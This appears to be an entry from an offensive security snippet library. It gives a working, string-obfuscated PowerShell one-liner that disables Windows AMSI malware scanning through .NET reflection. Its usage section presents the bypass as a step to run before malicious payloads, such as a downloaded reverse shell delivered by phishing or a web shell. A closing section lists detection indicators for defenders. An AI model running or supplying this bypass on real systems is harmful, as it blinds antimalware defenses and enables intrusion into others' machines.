---
id: 91ce0be2-a096-4826-bc60-feef9958a31f
name: PowerShell-Disable-AMSI-Script
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:26.409542+00:00'
updated_at: '2023-04-10T20:37:02.992728+00:00'
platforms:
  - Windows
tags:
  - AMSI
  - PowerShell
  - Defense-Evasion
validated: true
---

# PowerShell-Disable-AMSI-Script

## Code

```powershell
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
```

## Description

This PowerShell code snippet disables AMSI by setting the 'amsiInitFailed' field to true using .NET reflection. It uses string concatenation to obfuscate sensitive terms like 'AmsiUtils' and 'amsiInitFailed', helping evade static analysis. The code targets the current PowerShell session and is useful for bypassing script scanning in defense evasion scenarios.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | No variables; the code is self-contained with hardcoded obfuscated strings. | N/A |

## Usage

Execute directly in a PowerShell console or embed in a larger script before running malicious payloads. For example, in post-exploitation: disable AMSI first, then download and execute a reverse shell. Delivery methods include phishing attachments or compromised web shells. Note: Effects are session-specific and do not persist reboots.

## Detection

- PowerShell ScriptBlock logging captures the reflection call and string concatenation patterns.
- EDR tools monitor for modifications to AmsiUtils fields or unusual .NET assembly access.
- Behavioral indicators: PowerShell spawning child processes post-execution without AV blocks.
- Signatures for common obfuscation like 'Ams'+'iUtils' in logs.

## Related

- [[Disable-AMSI-via-PowerShell]]
- [[powershell-disable-amsi]]
